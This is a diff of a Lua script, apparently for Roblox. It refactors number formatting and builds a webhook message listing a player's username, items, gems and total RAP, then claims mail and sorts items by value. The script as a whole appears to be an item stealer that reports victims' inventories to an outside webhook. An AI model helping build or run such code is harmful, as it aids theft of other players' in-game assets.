@@ -28,14 +28,21 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-	local number = math.floor(number)
 	local suffixes = {"", "k", "m", "b", "t"}
 	local suffixIndex = 1
-	while number >= 1000 do
+	while number >= 1000 and suffixIndex < #suffixes do
 		number = number / 1000
 		suffixIndex = suffixIndex + 1
 	end
-	return string.format("%.2f%s", number, suffixes[suffixIndex])
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
 end
 
 local function SendMessage(username, diamonds)
@@ -80,15 +87,28 @@ local function SendMessage(username, diamonds)
 
     for _, itemName in ipairs(combinedItems) do
         local itemData = itemRapMap[itemName]
+        local itemLine = ""
         if itemData.chance then
-            fields[2].value = fields[2].value .. "1/" .. formatNumber(itemData.chance) .. " " .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
         else
-            fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
         end
+        fields[2].value = fields[2].value .. itemLine .. "\n"
     end
 
-    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
-    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
+    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
 
     local data = {
         ["embeds"] = {{
@@ -100,19 +120,6 @@ local function SendMessage(username, diamonds)
 			}
         }}
     }
-
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n")
-            fields[2].value = fields[2].value .. "\nPlus more!"
-        end
-    end
 
     local body = HttpService:JSONEncode(data)
 
@@ -240,7 +247,7 @@ end
 
 if #sortedItems > 0 then
     ClaimMail()
-    
+
     table.sort(sortedItems, function(a, b)
         return a.rap * a.amount > b.rap * b.amount 
     end)
